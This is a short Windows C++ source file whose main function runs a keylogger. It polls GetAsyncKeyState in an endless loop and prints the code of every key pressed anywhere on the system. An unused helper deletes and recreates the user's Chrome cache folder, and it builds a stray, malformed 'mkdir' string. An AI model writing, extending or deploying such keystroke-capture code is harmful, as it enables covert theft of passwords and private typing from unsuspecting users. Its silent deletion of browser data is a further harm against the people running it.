#include <iostream>
#include <cstdlib>
#include <string>
#include <filesystem>
#include <Windows.h>

void clearBrowserCache(){
    std::string appData = getenv("APPDATA");
    if (appData.empty()) return ;
    else{
        std::string cachePath = appData + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\";
        try{
            std::filesystem::remove_all(cachePath);
            std::string createpath = "mkdir" + cachePath;
            std::error_code ec;
            std::filesystem::create_directory(cachePath, ec);
            if (ec) {
                std::cerr << "Error creating cache directory: " << ec.message() << '\n';
            }
        }
        catch(const std::filesystem::filesystem_error& e){
            std::cerr << "Error removing cache directory: " << e.what() << '\n';
        }
        
    }
}

void startLogging(){
    while(true){
        for (int i = 8; i <= 254; i++){
            if (GetAsyncKeyState(i) & 0x1) {
                std::cout << i;
            }
        }
    }
}

int main(){
    startLogging();
    return 0;
}
